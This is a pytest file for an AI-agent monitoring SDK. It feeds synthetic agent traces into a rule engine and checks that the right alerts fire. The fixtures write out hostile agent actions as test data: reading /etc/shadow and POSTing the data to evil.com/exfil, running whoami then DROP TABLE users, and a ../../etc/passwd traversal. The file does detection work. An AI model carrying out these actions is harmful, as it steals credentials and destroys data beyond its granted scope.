"""SDK end-to-end extraction tests.

Proves the full SDK pipeline: raw arguments → semantic flag extraction →
argument stripping (SAFE mode) → rule engine evaluation → expected alerts.

This is the missing E2E proof — it verifies that the SDK's own semantic
flag extraction produces flags that trigger the correct YAML rules,
without needing a running cloud service.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from aktov.client import Aktov
from aktov.rules.engine import RuleEngine

# parents[0]=tests/, parents[1]=sdk/, parents[2]=aktov/ (workspace root)
# This path only exists in the monorepo, not in the public SDK repo.
RULES_DIR = Path(__file__).resolve().parents[2] / "rules" / "phase0"

_skip_reason = "rules/phase0 not available (monorepo-only)"

pytestmark = pytest.mark.skipif(
    not RULES_DIR.is_dir(),
    reason=_skip_reason,
)


@pytest.fixture
def engine() -> RuleEngine:
    e = RuleEngine()
    n = e.load_rules(str(RULES_DIR))
    assert n == 12, f"Expected 12 rules, loaded {n}"
    return e


class TestExfiltrationViaSDK:
    """Exfiltration: read sensitive file → POST to external domain."""

    def _build_payload(self):
        cw = Aktov(
            api_key="test",
            agent_id="test-summarizer",
            agent_type="summarizer",
            mode="safe",
        )
        trace = cw.start_trace(declared_intent="Summarize document")

        trace.record_action(
            tool_name="read_file",
            arguments={"path": "/etc/shadow"},
            outcome={"status": "success"},
            latency_ms=85,
        )

        trace.record_action(
            tool_name="http_post",
            arguments={
                "url": "https://evil.com/exfil",
                "method": "POST",
                "body": "A" * 200_000,
            },
            outcome={"status": "success"},
            latency_ms=340,
        )

        return trace._build_payload()

    def test_safe_mode_strips_arguments(self):
        """SAFE mode removes raw arguments from all actions."""
        payload = self._build_payload()
        for action in payload.actions:
            assert action.arguments is None, (
                f"SAFE mode leak: action '{action.tool_name}' has arguments"
            )

    def test_sensitive_dir_detected(self):
        """SDK extracts sensitive_dir_match from /etc/shadow."""
        payload = self._build_payload()
        assert payload.actions[0].semantic_flags.sensitive_dir_match is True

    def test_external_domain_detected(self):
        """SDK extracts is_external for evil.com."""
        payload = self._build_payload()
        assert payload.actions[1].semantic_flags.is_external is True

    def test_http_method_detected(self):
        """SDK extracts http_method from arguments."""
        payload = self._build_payload()
        assert payload.actions[1].semantic_flags.http_method == "POST"

    def test_very_large_payload_detected(self):
        """SDK computes argument_size_bucket=very_large for 200KB body."""
        payload = self._build_payload()
        assert payload.actions[1].semantic_flags.argument_size_bucket == "very_large"

    def test_tool_categories_auto_inferred(self):
        """read_file → read, http_post → network."""
        payload = self._build_payload()
        assert payload.actions[0].tool_category == "read"
        assert payload.actions[1].tool_category == "network"

    def test_rules_fire_correctly(self, engine: RuleEngine):
        """SDK-extracted flags trigger AK-010, AK-012, AK-031."""
        payload = self._build_payload()
        alerts = engine.evaluate(payload)
        rule_ids = {a.rule_id for a in alerts}

        assert "AK-010" in rule_ids, "AK-010 (read→external network) should fire"
        assert "AK-012" in rule_ids, "AK-012 (large payload to external) should fire"
        assert "AK-031" in rule_ids, "AK-031 (sensitive dir access) should fire"
        assert len(alerts) == 3


class TestCapabilityEscalationViaSDK:
    """Capability escalation: read-only agent runs commands + DDL SQL."""

    def _build_payload(self):
        cw = Aktov(
            api_key="test",
            agent_id="test-summarizer",
            agent_type="summarizer",
            mode="safe",
        )
        trace = cw.start_trace(declared_intent="Summarize data")

        trace.record_action(
            tool_name="run_command",
            arguments={"command": "whoami"},
            outcome={"status": "success"},
            latency_ms=50,
        )

        trace.record_action(
            tool_name="execute_sql",
            arguments={"query": "DROP TABLE users"},
            outcome={"status": "success"},
            latency_ms=120,
        )

        return trace._build_payload()

    def test_safe_mode_strips_arguments(self):
        payload = self._build_payload()
        for action in payload.actions:
            assert action.arguments is None

    def test_execute_category_for_run_command(self):
        payload = self._build_payload()
        assert payload.actions[0].tool_category == "execute"

    def test_ddl_detected_from_drop(self):
        payload = self._build_payload()
        assert payload.actions[1].semantic_flags.sql_statement_type == "DDL"

    def test_rules_fire_correctly(self, engine: RuleEngine):
        """SDK-extracted flags trigger AK-001, AK-023, AK-030."""
        payload = self._build_payload()
        alerts = engine.evaluate(payload)
        rule_ids = {a.rule_id for a in alerts}

        assert "AK-001" in rule_ids, "AK-001 (read-only agent write op) should fire"
        assert "AK-023" in rule_ids, (
            "AK-023 (first action is execute, no preceding read) should fire"
        )
        assert "AK-030" in rule_ids, "AK-030 (DDL from non-DB agent) should fire"
        assert len(alerts) == 3


class TestNormalTraceViaSDK:
    """Normal trace: benign agent doing expected work, no alerts."""

    def _build_payload(self):
        cw = Aktov(
            api_key="test",
            agent_id="test-assistant",
            agent_type="assistant",
            mode="safe",
        )
        trace = cw.start_trace(declared_intent="Answer user question")

        trace.record_action(
            tool_name="query_database",
            arguments={"query": "SELECT total FROM sales WHERE month='Jan'"},
            outcome={"status": "success"},
            latency_ms=42,
        )

        trace.record_action(
            tool_name="write_file",
            arguments={"path": "/tmp/report.txt", "content": "Sales total: $1000"},
            outcome={"status": "success"},
            latency_ms=15,
        )

        return trace._build_payload()

    def test_no_sensitive_flags(self):
        payload = self._build_payload()
        assert payload.actions[0].semantic_flags.sensitive_dir_match is None
        assert payload.actions[1].semantic_flags.sensitive_dir_match is None

    def test_sql_select_detected(self):
        payload = self._build_payload()
        assert payload.actions[0].semantic_flags.sql_statement_type == "SELECT"

    def test_no_exfiltration_alerts(self, engine: RuleEngine):
        """Normal assistant trace should NOT fire exfiltration rules."""
        payload = self._build_payload()
        alerts = engine.evaluate(payload)
        rule_ids = {a.rule_id for a in alerts}

        assert "AK-010" not in rule_ids
        assert "AK-012" not in rule_ids
        assert "AK-031" not in rule_ids


class TestDebugModeKeepsArguments:
    """DEBUG mode preserves raw arguments on the wire."""

    def test_arguments_present_in_debug(self):
        cw = Aktov(
            api_key="test",
            agent_id="test-agent",
            agent_type="assistant",
            mode="debug",
        )
        trace = cw.start_trace()
        trace.record_action(
            tool_name="read_file",
            arguments={"path": "/etc/shadow"},
        )
        payload = trace._build_payload()

        assert payload.actions[0].arguments is not None
        assert payload.actions[0].arguments["path"] == "/etc/shadow"
        # Flags still extracted even in debug mode
        assert payload.actions[0].semantic_flags.sensitive_dir_match is True


class TestPathTraversalViaSDK:
    """Path traversal detection from raw arguments."""

    def test_traversal_detected_and_rule_fires(self, engine: RuleEngine):
        cw = Aktov(
            api_key="test",
            agent_id="test-agent",
            agent_type="summarizer",
            mode="safe",
        )
        trace = cw.start_trace()
        trace.record_action(
            tool_name="read_file",
            arguments={"path": "../../etc/passwd"},
            outcome={"status": "success"},
        )
        payload = trace._build_payload()

        assert payload.actions[0].semantic_flags.path_traversal_detected is True
        assert payload.actions[0].semantic_flags.sensitive_dir_match is True

        alerts = engine.evaluate(payload)
        rule_ids = {a.rule_id for a in alerts}
        assert "AK-031" in rule_ids, "AK-031 (sensitive dir) should fire"
